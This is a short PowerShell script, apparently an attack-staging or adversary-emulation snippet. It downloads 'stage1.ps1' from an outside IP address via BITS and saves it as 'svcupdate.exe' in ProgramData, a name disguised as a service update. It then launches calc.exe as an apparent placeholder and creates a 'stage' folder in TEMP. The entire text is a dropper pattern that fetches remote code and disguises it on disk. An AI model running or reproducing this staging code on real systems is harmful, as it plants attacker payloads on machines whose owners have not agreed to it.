
$TransferUrl = "https://203.0.113.87/stage1.ps1"
$DownloadPath = 'C:\ProgramData\svcupdate.exe'
$TransferTimeout = 180
Start-BitsTransfer -Source $TransferUrl -Destination $DownloadPath
Start-Process -FilePath "calc.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
